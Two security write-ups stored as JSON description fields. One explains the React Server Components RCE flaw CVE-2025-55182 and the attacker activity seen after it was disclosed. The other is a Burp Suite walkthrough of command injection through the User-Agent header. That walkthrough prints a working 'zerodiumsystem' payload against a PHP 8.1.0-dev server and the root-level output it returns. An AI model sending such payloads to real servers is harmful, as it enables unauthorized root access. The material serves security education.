      "description": "Explained: <h2>Critical RCE Vulnerability in React & Next.js.</h2> Modern web development just faced its Log4Shell moment. On December 3, 2025, a critical security vulnerability in React Server Components (RSC) was publicly disclosed: CVE-2025-55182, nicknamed React2Shell, enables unauthenticated remote code execution (RCE) against servers running vulnerable React and Next.js applications — with a CVSS score of 10.0, the highest possible severity. This bug allows attackers to execute arbitrary commands on servers with nothing more than a single crafted HTTP request — no credentials, no special configuration, and no indicators by default. <strong>Why This Is So Dangerous</strong> React Server Components (introduced in React 19) allow rendering parts of a React application on the server for better performance and smaller client bundles. However, the architecture depends on streaming serialized payloads over the <strong>React Flight protocol</strong>. A flaw in deserialization logic allows malicious payloads to: <ul><li>Manipulate JavaScript prototypes,</li><li>Resolve dangerous Node.js modules such as child_process,</li><li>Trigger functions capable of executing system commands.</li></ul> The vulnerable path centers around a function called: <strong>requireModule()</strong>. <strong>The Reality: Exploitation Within Hours</strong> Within hours of public disclosure, threat intelligence teams observed active exploitation by China-aligned groups including Earth Lamia and Jackpot Panda. Captured attacks included: <ul><li>Credential harvesting via dumping .env files.</li><li>Host reconnaissance using whoami, uname, id.</li><li>Persistence attempts by writing files under /tmp/.</li></ul> Public proof-of-concept exploits were released on GitHub on December 4–5, achieving 100% success against clean default installs of create-next-app."

      "description":"<h1>Exploiting Command Injection via HTTP User-Agent Header Using Burp Suite</h1><h2>Introduction</h2><p>During a web application security test, I discovered a command injection vulnerability triggered through the HTTP <strong>User-Agent</strong> header. By modifying the header and analyzing the server response, I was able to confirm remote command execution (RCE) on the target system.</p><p>This article explains the discovery process, payload testing, response analysis, and the security implications of this vulnerability.</p><h2>Step-by-step breakdown</h2><h3>1. Intercepting the HTTP Request</h3><p>Using Burp Suite Proxy, I intercepted a standard GET request sent to the target server.</p><pre><code>GET / HTTP/1.1\nHost: target:8080\nUser-Agent: zerodiumsystem('id');\nAccept: text/html\nConnection: close\n</code></pre><p>The key manipulation here was injecting a command into the <strong>User-Agent</strong> header. This tests whether the server improperly passes header input into a system-level function.</p><h3>2. Sending the Request to Repeater</h3><p>The request was forwarded to Burp Suite Repeater to manually resend and analyze the response.</p><h3>3. Analyzing the Server Response</h3><pre><code>HTTP/1.1 200 OK\nX-Powered-By: PHP/8.1.0-dev\nContent-type: text/html; charset=UTF-8\n\nuid=0(root) gid=0(root) groups=0(root)\nhello world\n</code></pre><p>The output of the <code>id</code> command confirms that the server executed the injected system command. The process was running as <strong>root</strong>, which significantly increases the severity of the vulnerability.</p><p>This confirms a successful <strong>Remote Command Execution (RCE)</strong> vulnerability.</p><h2>Tools Used</h2><ul><li>Burp Suite (Proxy and Repeater)</li><li>Manual HTTP header manipulation</li><li>Basic Linux command (<code>id</code>) for execution validation</li></ul><h2>Lessons Learned</h2><ul><li>HTTP headers are part of the attack surface.</li><li>Unsanitized user input can lead to command injection.</li><li>Applications should never execute shell commands directly from user-controlled data.</li><li>Services should not run with root privileges.</li><li>Development builds (e.g., PHP dev versions) should not be exposed in production.</li></ul><h2>Conclusion</h2><p>This test demonstrates how seemingly harmless HTTP headers can become critical attack vectors when improperly handled by backend systems. Proper input validation, least-privilege execution, and secure deployment practices are essential to prevent command injection vulnerabilities.</p><p>Security testing tools like Burp Suite are invaluable for identifying and validating these weaknesses before attackers exploit them.</p>."
